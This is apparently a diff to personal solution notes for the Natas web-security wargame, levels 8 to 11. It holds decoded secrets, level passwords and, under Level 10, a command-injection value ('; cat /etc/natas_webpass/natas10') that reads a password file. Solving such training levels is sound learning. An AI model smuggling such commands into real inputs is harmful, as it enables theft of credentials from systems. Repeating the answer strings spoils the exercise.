@@ -42,9 +42,15 @@ a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
 encodeSecret($_POST['secret'])
 
 bin2hex(strrev(base64_encode($secret))) -> 
-	] + base64_decode(strrev(pack(3d3d516343746d4d6d6c315669563362)))'
-<?base64_decode(strrev(pack(3d3d516343746d4d6d6c315669563362)))?>
+	base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+==QcCtmMml1ViV3b
+b3ViV1lmMmtCcQ==
+oubWYf2kBq
+Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 
 ======Level 10======
+; cat /etc/natas_webpass/natas10
+D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
 
 ======Level 11======
+?><?php
